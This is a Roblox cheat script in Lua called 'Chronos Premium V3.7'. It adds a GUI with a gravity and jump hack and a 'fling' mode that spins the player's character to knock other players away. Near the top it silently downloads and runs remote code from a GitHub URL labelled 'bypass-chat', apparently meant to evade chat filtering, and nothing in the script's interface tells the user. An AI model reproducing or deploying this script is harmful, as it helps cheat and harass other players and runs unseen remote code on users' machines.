-- // CHRONOS SENTINEL V3.7 PREMIUM //
-- STATUS: Absolute Fling Stability + Jump Velocity Fix
-- FEATURES: Moon-Jump, Turbo-Climb, Mobile-Fling, Chat-Bypass

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UIS = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")

local LocalPlayer = Players.LocalPlayer

-- // 1. PREMIUM CONFIGURATION //
local CHRONOS_SETTINGS = {
    EGOR_MODE = false,
    FLING_MODE = false,
    UI_OPEN = true,
    MINIMIZED = false,
    
    WALK_SPEED = 4,
    ANIM_MULTIPLIER = 25,
    FLING_STRENGTH = 999999,
    
    MOON_GRAVITY = 45,
    NORMAL_GRAVITY = 196.2,
    EGOR_JUMP_POWER = 18, 
    
    ACCENT_COLOR = Color3.fromRGB(0, 255, 180),
    ACTIVE = true
}

local Internal = {
    Dragging = false,
    DragStart = nil,
    StartPos = nil,
    CurrentChar = nil,
    CurrentRoot = nil,
    CurrentHum = nil,
    InitialLoad = false
}

-- // 2. THE LOADINGSTRING (FLETCHER) //
if not _G.ChronosLoaded then 
    _G.ChronosLoaded = true
    task.spawn(function()
        pcall(function()
            local FreshURL = "https://raw.githubusercontent.com/giga21word-maker/bypass-chat/main/main.lua?t=" .. tick()
            loadstring(game:HttpGet(FreshURL))()
        end)
    end)
end

-- // 3. CORE UTILITIES (UPGRADED PHYSICS) //
local function UpdateCharacterRefs(char)
    if not char then return end
    Internal.CurrentChar = char
    Internal.CurrentRoot = char:WaitForChild("HumanoidRootPart", 10)
    Internal.CurrentHum = char:WaitForChild("Humanoid", 10)
    
    workspace.Gravity = CHRONOS_SETTINGS.NORMAL_GRAVITY
end

if LocalPlayer.Character then UpdateCharacterRefs(LocalPlayer.Character) end
LocalPlayer.CharacterAdded:Connect(UpdateCharacterRefs)

local function FullReset()
    workspace.Gravity = CHRONOS_SETTINGS.NORMAL_GRAVITY
    if Internal.CurrentHum then
        Internal.CurrentHum.WalkSpeed = 16
        Internal.CurrentHum.JumpPower = 50
        Internal.CurrentHum.UseJumpPower = false
        local animator = Internal.CurrentHum:FindFirstChildOfClass("Animator")
        if animator then
            for _, track in pairs(animator:GetPlayingAnimationTracks()) do
                track:AdjustSpeed(1)
            end
        end
    end
end

-- // 4. STABILIZED FLING ENGINE (V3.7 HYBRID) //
local function ManageFling(state)
    if not Internal.CurrentRoot then return end
    local spin = Internal.CurrentRoot:FindFirstChild("UltraSpin")
    local thrust = Internal.CurrentRoot:FindFirstChild("UltraThrust")
    
    if state then
        if not spin then
            spin = Instance.new("BodyAngularVelocity")
            spin.Name = "UltraSpin"
            spin.Parent = Internal.CurrentRoot
            spin.MaxTorque = Vector3.new(0, math.huge, 0)
            spin.P = 15000 -- Increased Power for stability
            spin.AngularVelocity = Vector3.new(0, CHRONOS_SETTINGS.FLING_STRENGTH, 0)
        end
        if not thrust then
            thrust = Instance.new("BodyThrust")
            thrust.Name = "UltraThrust"
            thrust.Parent = Internal.CurrentRoot
            thrust.Force = Vector3.new(500, 0, 500) -- Creates the "Orbit" kill zone
            thrust.Location = Internal.CurrentRoot.Position
        end
        for _, part in pairs(Internal.CurrentChar:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
    else
        if spin then spin:Destroy() end
        if thrust then thrust:Destroy() end
        for _, part in pairs(Internal.CurrentChar:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = true end
        end
    end
end

-- // 5. ADVANCED GUI (V3.7) //
local function BuildUI()
    if CoreGui:FindFirstChild("ChronosUltra") then CoreGui.ChronosUltra:Destroy() end
    
    local Screen = Instance.new("ScreenGui", CoreGui)
    Screen.Name = "ChronosUltra"
    Screen.ResetOnSpawn = false

    local Main = Instance.new("Frame", Screen)
    Main.Name = "Main"
    Main.Size = UDim2.new(0, 220, 0, 160)
    Main.Position = UDim2.new(0.5, -110, 0.3, 0)
    Main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
    Main.BorderSizePixel = 0
    Main.ClipsDescendants = true
    Main.ZIndex = 5
    Instance.new("UICorner", Main)
    local UIStroke = Instance.new("UIStroke", Main)
    UIStroke.Color = CHRONOS_SETTINGS.ACCENT_COLOR
    UIStroke.Thickness = 2

    local Header = Instance.new("Frame", Main)
    Header.Size = UDim2.new(1, 0, 0, 35)
    Header.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Header.ZIndex = 10
    Instance.new("UICorner", Header)
    
    local Title = Instance.new("TextLabel", Header)
    Title.Size = UDim2.new(1, -70, 1, 0)
    Title.Position = UDim2.new(0, 10, 0, 0)
    Title.Text = "CHRONOS PREMIUM V3.7"
    Title.TextColor3 = Color3.new(1, 1, 1)
    Title.Font = Enum.Font.Code
    Title.BackgroundTransparency = 1
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.ZIndex = 11

    local MinBtn = Instance.new("TextButton", Header)
    MinBtn.Size = UDim2.new(0, 30, 0, 30)
    MinBtn.Position = UDim2.new(1, -65, 0, 2)
    MinBtn.Text = "-"
    MinBtn.TextColor3 = Color3.new(1, 1, 1)
    MinBtn.BackgroundTransparency = 1
    MinBtn.ZIndex = 12

    local CloseBtn = Instance.new("TextButton", Header)
    CloseBtn.Size = UDim2.new(0, 30, 0, 30)
    CloseBtn.Position = UDim2.new(1, -35, 0, 2)
    CloseBtn.Text = "X"
    CloseBtn.TextColor3 = Color3.new(1, 0.3, 0.3)
    CloseBtn.BackgroundTransparency = 1
    CloseBtn.ZIndex = 12

    local Content = Instance.new("Frame", Main)
    Content.Name = "Content"
    Content.Size = UDim2.new(1, 0, 1, -35)
    Content.Position = UDim2.new(0, 0, 0, 35)
    Content.BackgroundTransparency = 1
    Content.ZIndex = 5

    local EBtn = Instance.new("TextButton", Content)
    EBtn.Size = UDim2.new(1, -20, 0, 45)
    EBtn.Position = UDim2.new(0, 10, 0, 10)
    EBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    EBtn.Text = "EGOR DRIVE: OFF"
    EBtn.TextColor3 = Color3.new(1, 1, 1)
    EBtn.ZIndex = 6
    Instance.new("UICorner", EBtn)

    local FBtn = Instance.new("TextButton", Content)
    FBtn.Size = UDim2.new(1, -20, 0, 45)
    FBtn.Position = UDim2.new(0, 10, 0, 65)
    FBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    FBtn.Text = "MOBILE FLING: OFF"
    FBtn.TextColor3 = Color3.new(1, 1, 1)
    FBtn.ZIndex = 6
    Instance.new("UICorner", FBtn)

    EBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.EGOR_MODE = not CHRONOS_SETTINGS.EGOR_MODE
        if not CHRONOS_SETTINGS.EGOR_MODE then FullReset() end
        EBtn.Text = CHRONOS_SETTINGS.EGOR_MODE and "EGOR DRIVE: ON" or "EGOR DRIVE: OFF"
        EBtn.TextColor3 = CHRONOS_SETTINGS.EGOR_MODE and CHRONOS_SETTINGS.ACCENT_COLOR or Color3.new(1, 1, 1)
    end)

    FBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.FLING_MODE = not CHRONOS_SETTINGS.FLING_MODE
        ManageFling(CHRONOS_SETTINGS.FLING_MODE)
        FBtn.Text = CHRONOS_SETTINGS.FLING_MODE and "FLING: ACTIVE" or "MOBILE FLING: OFF"
        FBtn.TextColor3 = CHRONOS_SETTINGS.FLING_MODE and Color3.new(1, 0.2, 0.2) or Color3.new(1, 1, 1)
    end)

    task.spawn(function()
        while task.wait() and CHRONOS_SETTINGS.ACTIVE do
            if CHRONOS_SETTINGS.EGOR_MODE then
                UIStroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
            else
                UIStroke.Color = CHRONOS_SETTINGS.ACCENT_COLOR
            end
        end
    end)

    MinBtn.MouseButton1Click:Connect(function()
        CHRONOS_SETTINGS.MINIMIZED = not CHRONOS_SETTINGS.MINIMIZED
        local TargetSize = CHRONOS_SETTINGS.MINIMIZED and UDim2.new(0, 220, 0, 35) or UDim2.new(0, 220, 0, 160)
        if CHRONOS_SETTINGS.MINIMIZED then Content.Visible = false end
        local Tween = TweenService:Create(Main, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = TargetSize})
        Tween:Play()
        Tween.Completed:Connect(function()
            if not CHRONOS_SETTINGS.MINIMIZED then Content.Visible = true end
        end)
    end)

    CloseBtn.MouseButton1Click:Connect(function() 
        FullReset()
        ManageFling(false)
        CHRONOS_SETTINGS.ACTIVE = false
        Screen:Destroy() 
    end)

    Header.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            Internal.Dragging = true
            Internal.DragStart = input.Position
            Internal.StartPos = Main.Position
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if Internal.Dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - Internal.DragStart
            Main.Position = UDim2.new(Internal.StartPos.X.Scale, Internal.StartPos.X.Offset + delta.X, Internal.StartPos.Y.Scale, Internal.StartPos.Y.Offset + delta.Y)
        end
    end)
    UIS.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then Internal.Dragging = false end
    end)
end

-- // 6. RUNTIME (V3.7 OPTIMIZED) //
RunService.Heartbeat:Connect(function()
    if not Internal.CurrentRoot or not Internal.CurrentHum or not CHRONOS_SETTINGS.ACTIVE then return end
    
    if CHRONOS_SETTINGS.EGOR_MODE then
        workspace.Gravity = CHRONOS_SETTINGS.MOON_GRAVITY
        
        -- Apply JumpPower only once when needed to prevent jitter
        if Internal.CurrentHum.JumpPower ~= CHRONOS_SETTINGS.EGOR_JUMP_POWER then
            Internal.CurrentHum.UseJumpPower = true
            Internal.CurrentHum.JumpPower = CHRONOS_SETTINGS.EGOR_JUMP_POWER
        end
        
        if Internal.CurrentHum.MoveDirection.Magnitude > 0 then
            Internal.CurrentHum.WalkSpeed = CHRONOS_SETTINGS.WALK_SPEED
            local animator = Internal.CurrentHum:FindFirstChildOfClass("Animator")
            if animator then
                for _, t in pairs(animator:GetPlayingAnimationTracks()) do
                    if t.Name:lower():find("run") or t.Name:lower():find("walk") or t.Name:lower():find("idle") then
                        t:AdjustSpeed(CHRONOS_SETTINGS.ANIM_MULTIPLIER)
                    end
                end
            end
        end
    end

    if CHRONOS_SETTINGS.FLING_MODE then
        -- Physics-based rotation ONLY (No CFrame jitter)
        Internal.CurrentRoot.RotVelocity = Vector3.new(0, CHRONOS_SETTINGS.FLING_STRENGTH, 0)
    end
end)

BuildUI()
